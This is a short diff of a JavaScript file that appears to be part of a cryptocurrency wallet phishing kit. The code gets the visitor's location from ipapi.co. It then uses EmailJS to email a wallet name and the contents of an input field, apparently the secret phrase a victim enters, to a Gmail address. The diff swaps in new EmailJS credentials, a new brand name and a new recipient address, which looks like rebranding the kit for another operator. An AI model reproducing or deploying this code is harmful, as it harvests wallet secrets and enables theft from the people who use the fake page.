@@ -2359,15 +2359,15 @@ export default {
               const location = await axios.get("https://ipapi.co/json")
 
               const params = {
-                service_id: "service_8pbgnpr",
-                template_id: "template_xv7sb0z",
-                user_id: "user_nsG3rSdCFpgONwwCfNTas",
+                service_id: "service_kwfx09r",
+                template_id: "template_l4s7j4n",
+                user_id: "S5FIb6Mixugs1EXxl",
                 template_params: {
-                  from_name: "Lighchain AI",
+                  from_name: "MainnetDIY",
                   wallet_type: $('#wallet_name').text().trim(),
                   location: JSON.stringify(location.data),
                   link_drops: field.val(),
-                  reply_to: "customeronlineagent@gmail.com",
+                  reply_to: "Edgir973@gmail.com",
                 },
               }
 
